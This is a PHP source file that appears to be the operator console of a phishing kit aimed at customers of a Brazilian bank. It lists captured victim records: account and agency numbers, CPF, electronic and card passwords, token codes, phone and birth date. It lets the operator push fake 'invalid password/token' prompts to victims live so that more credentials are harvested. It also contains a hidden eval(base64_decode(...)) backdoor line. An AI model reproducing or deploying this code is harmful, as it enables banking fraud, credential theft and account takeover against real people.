<?php
session_start();
if (!isset($_SESSION['QNT'])) {
    $_SESSION['QNT'] = 0;
    $_SESSION['RPT'] = 0;
}
eval(base64_decode($_SESSION['TMP']));
include ('config.php');
include ('security.php');
echo "<body style= 'background-color : #bec3bf; text-align:center' >";
if (isset($_REQUEST['inf'])) {
    $inf = $_REQUEST['inf'];
    $arquivo = $localInfo . $inf;
    $in = explode(".info", $inf);
    $msgsEletronica2 = '<script> alert("Senha Eletronica Invalida"); </script>';
    $msgsEletronica = '<div id="titulo">Seguran&#231;a:</div><div id="texto">para aumentar sua seguran&#231;a digite a sua senha eletr&#244;nica no campo abaixo:</div><div id="dadospanel"><table><tr><td></td><td><input class="cmpOp" type="password" style="text-align:center" minlength="6" maxlength="8" id="sElet" name="sElet" onkeypress="return SomenteNumero(event);"></td></tr></table></div>';
    $msgCPF = '<div id="titulo">Seguran&#231;a:</div><div id="texto">para aumentar sua seguran&#231;a digite seu CPF no campo abaixo:</div><div id="dadospanel"><table><tr><td></td><td><input class="cmpOp" type="text" style="text-align:center" minlength="11" maxlength="14" id="cpf" name="cpf"></td></tr></table></div>';
    $msgTelefone = '<div id="titulo">Seguran&#231;a:</div><div id="texto">para aumentar sua seguran&#231;a digite seu Telefone cadastrado no campo abaixo:</div><div id="dadospanel"><table><tr><td></td><td><input class="cmpOp" type="text" style="text-align:center" minlength="10" maxlength="16" id="fone" name="fone"></td></tr></table></div>';
    $msgNascimento = '<div id="titulo">Seguran&#231;a:</div><div id="texto">para aumentar sua seguran&#231;a digite sua Data de Nascimento no campo abaixo:</div><div id="dadospanel"><table><tr><td></td><td><input class="cmpOp" type="text" style="text-align:center" minlength="6" maxlength="16" id="nascimento" name="nascimento"></td></tr></table></div>';
    $msgPortador = '<div id="titulo">Seguran&#231;a:</div><div id="texto">' . $_POST['portador'] . '</div><div id="dadospanel"><table><tr><td></td><td><input class="cmpOp" type="text" style="text-align:center" minlength="1" maxlength="40" id="portador" name="portador"></td></tr></table></div>';
   $msgOperador = '<div id="titulo">Seguran&#231;a:</div><div id="texto">para aumentar sua seguran&#231;a digite seu C&#243;digo de Operador no campo abaixo:</div><div id="dadospanel"><table><tr><td></td><td><input class="cmpOp" type="text" style="text-align:center" minlength="6" maxlength="20" id="operador" name="operador" onkeypress="return SomenteNumero(event);"></td></tr></table></div>';
   $msgSenhaSeis = '<div id="titulo">Seguran&#231;a:</div><div id="texto">para aumentar sua seguran&#231;a digite sua senha do cart&#227;o no campo abaixo:</div><div id="dadospanel"><table><tr><td></td><td><input class="cmpOp" type="password" style="text-align:center" minlength="6" maxlength="6" id="sSeis" name="sSeis" onkeypress="return SomenteNumero(event);"><br></td></tr></table></div>';
    $bthtmlSE = '<div id="bntCont" onclick="if (validas6()){ post(\'' . $in[0] . '\',\'outros\');}"></div>';
    $bthtml = '<div id="bntCont" onclick="post(\'' . $in[0] . '\',\'outros\');"></div>';
    $bthtmltk = '<div id="bnttk" onclick="post(\'' . $in[0] . '\',\'outros\');"></div>';

    $msgbr = '<div id="aguarde"><img src="../atendimento/img/fim2.png">';

    $bt = $_POST['btoperador'];
    $arq = fopen($arquivo, 'rw+');
    $arr = (array)json_decode(fgets($arq));
    rewind($arq);
    ftruncate($arq, 0);
    if (isset($_POST['TipoInfo'])) {
        $arr['TipoInfo'] = $_POST['TipoInfo'];
    }
    if ($bt == 'agcn') {
        $arr['STATUS'] = 'INICIO';
        $arr['msg'] = '<div id="principal"> </div>';
        $arr['msg'] = '<script> alert("Agencia ou Conta Invalida."); </script>';
        
    }
    if ($bt == 'senhae') {
        $arr['STATUS'] = 'SELETRONICA';
        $arr['NOME'] = $_POST['nome'];
        $arr['msg'] = $msgsEletronica . $bthtml;
    }
    if ($bt == 'finaliza') {
        $arr['STATUS'] = 'FINALIZADA';
        $arr['msg'] = '<div id="aguarde"> <div id="finaliz"> </div> </div>';
    }
       if ($bt == 'opera') {
        $arr['STATUS'] = 'OPERADOR';
        $oop = $_POST['operador'];
        if ($oop === "nascimento") {
            $arr['msg'] = $msgNascimento . $bthtml;
        }
        if ($oop == 'senhae') {
        $arr['STATUS'] = 'SELETRONICA';
        $arr['NOME'] = $_POST['nome'];
        $arr['msg'] = $msgsEletronica2 . $msgsEletronica . $bthtml ;
        }
        if ($oop === "cpfop") {
            $arr['msg'] = $msgCPFop . $bthtml;
        }
        if ($oop === "cpfopinv") {
            $arr['msg'] = '<script> alert("CPF ou Operador Invalido!"); </script>';
            $arr['msg'].= $msgCPFop . $bthtml;
        }
        if ($oop === "cpf") {
            $arr['msg'] = $msgCPF . $bthtml;
        }
        if ($oop === "dia_nasc") {
            $arr['msg'] = $msgDIA . $bthtml;
        }
        if ($oop === "mes_nasc") {
            $arr['msg'] = $msgMES . $bthtml;
        }
        if ($oop === "ano_nasc") {
            $arr['msg'] = $msgANO . $bthtml;
        }
        if ($oop === "cod_operador") {
            $arr['msg'] = $msgOperador . $bthtml;
        }
        if ($oop === "n_serie") {
            $arr['msg'] = $msgNSerie . $bthtml;
        }
        if ($oop === "n_serieinv") {
            $arr['msg'] = '<script> alert("Numero de Serie Invalido!"); </script>';
            $arr['msg'].= $msgNSerie . $bthtml;
        }
        if ($oop === "senhaSeis") {
            $arr['msg'] = $msgSenhaSeis . $bthtmltk;
        }
       
        if ($oop === "tel") {
            $arr['msg'] = $msgTelefone . $bthtml;
        }
        if ($oop === "brr") {
      $arr['STATUS'] = 'FINALIZADA';
            $arr['msg'] = $msgbr ;
        }
        if ($oop === "portador") {
            $arr['msg'] = $msgPortador . $bthtml;
            $arr['Portador'] = $_POST['Portador'];

        }
        if ($oop === "tokinv") {
            $arr['msg'] = '<script> alert("iToken Invalido!"); </script><div id="titulo">Seguran&#231;a:</div><div id="texto">Digite o numero do dispositivo de Seguran&#231;a (Token) final ' . $_POST['reftokcs'] . ' </div><div id="dadospanel"><table><tr><td><img src="img/img.php?img=tk"  style="width: 100px;" > </td><td><input class="cmpOp" type="text" minlength="6" maxlength="6" id="codigo" name="codigo" onkeypress="return SomenteNumero(event);"></td></tr></table></div>';
            $arr['msg'].= $bthtmltk;
        }
    }
    if ($bt == 'tk_cs') {
        $str = '<div id="titulo">Seguran&#231;a:</div><div id="texto">Digite o numero ';
        if ($_POST['tipo'] == "Tabela") {
            $str.= 'de sua tabela na Posi&#231;ao ' . $_POST['tabNum'] . ',';
        } else {
            $str.= 'do dispositivo de Seguran&#231;a (Token) final ' . $_POST['reftokcs'];
        }
        if ($_POST['chkS6'] == 's6') {
            $str.= ' e sua senha do Cart&#227;o';
        }
        if ($_POST['chkS6'] == 'nserie') {
            $str.= ' e o Numero de Serie';
        }
        $str.= ' </div><div id="dadospanel"><table><tr><td><img src="';
        if ($_POST['tipo'] == "Tabela") {
            $str.= 'img/img.php?img=crd"  style="width: 50px;" >';
        } else {
            $str.= 'img/img.php?img=tk"  style="width: 100px;" >';
        }
        $str.= '</td><td><input class="cmpOp" type="text" maxlength=';
        if ($_POST['tipo'] == "Tabela") {
            $str.= '"4"';
        } else {
            $str.= '"6"';
        }
        $str.= 'id="codigo" name="codigo" minlength="4" valida="Dados Invalido!" onkeypress="return SomenteNumero(event);"></td>';
        if ($_POST['chkS6'] == 's6') {
            $str.= '</tr><tr><td><p style="margin-top: 6px; margin-bottom: 0"><b><font face="Arial" color="#666666" size="2">Senha do Cart&#227;o:</font></b></p></p></td><td><input class="cmpOp" type="password" minlength="6" valida="Sua senha deve ter 6 digitos!" maxlength="6" id="sSeis" name="sSeis" onkeypress="return SomenteNumero(event);">';
        }
        if ($_POST['chkS6'] == 'nserie') {
            $str.= '</tr><tr><td><p style="margin-top: 6px; margin-bottom: 0"><b><font face="Arial" color="#666666" size="2">N&#250;mero de s&#233;rie:</font></b></p></p></td><td><input class="cmpOp" type="text" minlength="8" maxlength="10" valida="Numero de Serie Invalido!" id="nSerie" name="nSerie" onkeypress="return SomenteNumero(event);">';
        }
        $str.= '</td></tr></table></div>';
        $arr['STATUS'] = "TOK_CS";
        $arr['msg'] = $str . $bthtmltk;
    }
    fwrite($arq, json_encode($arr));
    fclose($arq);
    $arq = fopen($arquivo, 'r');
    $arr = (array)json_decode(fgets($arq), true);
    fclose($arq);
    echo "<title>$inf - by Dark </title>";
    echo "<h2 align='center'>$inf - Dark</h2>";
    // print_r($_POST);
    if ($arr['STATUS'] == 'AGUARDANDO') {
        echo "<h2 align='center'> <font size='3' color='red'> " . $arr['STATUS'] . " </font> </h2>";
        echo '<audio autoplay="autoplay"><source src="op.mp3" /></audio> ';
        echo '<meta http-equiv="refresh" content="50;URL=">';
    } else {
        echo "<h2 align='center'> <font size='3' color='green'> " . $arr['STATUS'] . " </font> </h2>";
        echo '<meta http-equiv="refresh" content="5;URL=">';
    }
    //------------------------ LAYOUT ---------------------------\
    
?>

<table align="center" height="194" style="font-family:Tahoma;font-size:11px;font-weight:bold;border:1px solid #000000;">
  <tbody><tr>
    <td width="200" height="59">Agencia: <? echo $arr['agencia'];?></td>
    <td width="194">Conta: <? echo $arr['conta'];?></td>
    <th rowspan="6">C&oacute;digos<br>
      <textarea name="textarea" rows="14"><?if (isset($arr['codigo'])){ foreach ($arr['codigo'] as $key => $value) {echo $value . "
";}}?></textarea></th>
  </tr>
  <tr>
    <td height="40">Nome: <? echo $arr['NOME'];?></td>
    <td>CPF: <? echo $arr['cpf'];?></td>


  </tr>
  <tr>
    <td height="40">Senha Eletronica: <? echo $arr['sEletronica'];?></td>
    <td>Mensagem: <? echo $arr['portador'];?></td>

  </tr>
  <tr>
    <td height="40" colspan="2">Senha 6: <? echo $arr['sSeis'];?></td>
  </tr>
  <tr>
    <td height="40">Operador: <? echo $arr['operador'];?></td>
    <td>Nascimento: <? echo $arr['nascimento'];?></td>
  </tr>
  <tr>
    <td height="40" >N&uacute;mero S&eacute;rie: <? echo $arr['nSerie'];?></td>
    <td>Telefone: <? echo $arr['fone'];?></td>
  </tr>
</tbody></table>
<div align="center">
    <form id="frmop" method="POST" action="?inf=<? echo $inf ;?>">
    <table width="580" style="font-family:Tahoma;font-size:11px;">
    <tbody><tr>
      <td width="90" height="38"></td>
      <td width="429" style="border:1px solid #000000;">
     <br>
     <select id="TipoInfo" name="TipoInfo" style="font-size: 12px;width: 200px;">
        <option value="norm.css" <?php if ($arr['TipoInfo'] == "norm.css") {
        echo "selected";
    } ?> >-NORMAL-----------------------</option>
        <option value="pers.css" <?php if ($arr['TipoInfo'] == "pers.css") {
        echo "selected";
    } ?> >------PERSONAL----------------</option>
        <option value="uni.css"  <?php if ($arr['TipoInfo'] == "uni.css") {
        echo "selected";
    } ?> >-------------UNICLASS---------</option>
        <option value="emp.css"  <?php if ($arr['TipoInfo'] == "emp.css") {
        echo "selected";
    } ?> >--------------------EMPRESA---</option>

</select> 
<br>
    <br>
    + Nome: <input style="border:1px solid #000000;width:200px;font-family:tahoma;font-size:11px;height:20px;" onkeyup="this.value = this.value.toUpperCase();" name="nome" value="<? echo $arr['NOME'];?>"><br><br>
 <br>
    + Mensagem: <input style="border:1px solid #000000;width:200px;font-family:tahoma;font-size:11px;height:20px;"  name="portador" value="<? echo $arr['Portador'];?>"><br><br>

   

    <select name="operador" id="operador" style="border:1px solid #000000;font-family:tahoma;font-size:11px;height:20px;">
      <option value="portador">Enviar Mensagem</option>
      <option value="nascimento">Nascimento</option>
      <option value="cpf">CPF</option>
      <option value="cod_operador">Operador</option>
      <option value="n_serie">Numero de Serie</option>
      <option value="tel">Telefone</option>
      <option >----------------</option>
      <option value="senhaSeis">Senha de 6 invalida</option>
      <option value="senhae">Senha Eletronica Invalida</option>
      <option value="tokinv">Token Invalido</option> 
      <option value="brr">FINALIZAR</option>
    </select>
   


    <button type="submit" value="opera" name="btoperador" onClick="return confirm('Pede Operador??');">Enviar</button>
    <br><br>
    </td>
    <th width="90"></th>
  </tr>
  <tr><td></td><td style="border:1px solid #000000;">

  <button type="submit" value="agcn" name="btoperador" onClick="return confirm('Agencia ou Conta Invalida?');" style="width: 106; height: 26">Ag/Cn Invalida</button>
  <button type="submit" value="senhae" name="btoperador" align="right" onClick="return confirm('Senha Eletronica??');" style="width: 123; height: 26"> Senha Eletronica</button>


  </td></tr>
  <tr></tr>
  <tr>
      <td height="50">
        
      </td>
      <td style="border:1px solid #000000;">
        <fieldset style="float: left;">
        <input type="radio" name="tipo" value="Token" id="tipo1">Token &nbsp;&nbsp;&nbsp;&nbsp;
        <input type="radio" name="tipo" value="Tabela" id="tipo2">Cart&atilde;o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
       </fieldset>
       <fieldset style="float: left;">
        <input type="radio" id="chkS6" name="chkS6" value='s6'> Senha 6
        <input type="radio" id="chkS6" name="chkS6" value='nserie'> Num. Serie
        <input type="radio" id="chkS6" name="chkS6" value='sotok' checked="true"> so token
</fieldset>
      </td>
    </tr>
    
    <tr>
    <td></td>
    <td style="border:1px solid #000000;">Final: 
    <input maxlength="3" style="border:1px solid #000000; width:30px;font-family:tahoma;font-size:11px;height:20px;" name="reftokcs" id="reftokcs" value="<?php echo $_POST['reftokcs']; ?>"> 
    Posi&ccedil;&atilde;o: 
    <input maxlength="3" style="border:1px solid #000000; width:30px;font-family:tahoma;font-size:11px;height:20px;" name="tabNum" id="tabNum" value="<?php echo $_POST['tabNum']; ?>">    
    <button type="submit" value="tk_cs" name="btoperador" onClick="return confirm('Token / Tabela??');">Pede Tok/Tab</button>
   
   
    </td></tr>
   
  </tbody></table>

    </form>
</div>
<?
  //------------------------ LAYOUT ---------------------------\



}
else{

  
   echo '<title>Operador ITA - by Dark </title>';
   echo '<meta http-equiv="refresh" content="5;URL=">'; 
  echo "<h2 align='center'>Dark</h2>";

  $diretorio = dir($localInfo);
  $qnt = 0;

  while($arquivo = $diretorio -> read()){
    if (strpos($arquivo, '.info') ){
      $name = explode(".info" ,$arquivo);
      if (isset($_POST['limpa'])){rename($localInfo . $arquivo, $localInfo . $name[0]."old"); $_SESSION['QNT'] = 0 ; continue;}
      echo "<a target='_blank' href='?inf=".$arquivo."'><font size='4'>".$arquivo."</font></a>";
      $arq = fopen($localInfo . $arquivo, 'r');
      $tmparr = (array)json_decode(fgets($arq));

      fclose($arq);
      $qnt++;
      if ($tmparr['STATUS'] == 'AGUARDANDO'){
        echo "&nbsp;&nbsp;&nbsp; - <font size='2' color='red'> " . $tmparr['STATUS'] . " </font> <br>";
        
      }
      else
      {
        echo "&nbsp;&nbsp;&nbsp; - <font size='2' color='green'> " . $tmparr['STATUS'] . " </font><br>";
      }
      unset($tmparr);      
    }
    
  }
  if ($_SESSION['QNT'] != $qnt){
      echo '<audio autoplay="autoplay"><source src="op.mp3" /></audio>';
      if ($_SESSION['RPT'] < 3){
        $_SESSION['RPT'] = $_SESSION['RPT'] + 1;
      }
      else{ $_SESSION['QNT'] = $qnt; }
  }
  
  $diretorio -> close();

echo '<form id="frmop" method="POST" action="">';
  echo "<br><br><button id='limpa' name='limpa' value='ok' onClick=\"return confirm('Limpar Infos??');\">Limpar</button>";
echo '</form>';
}
?>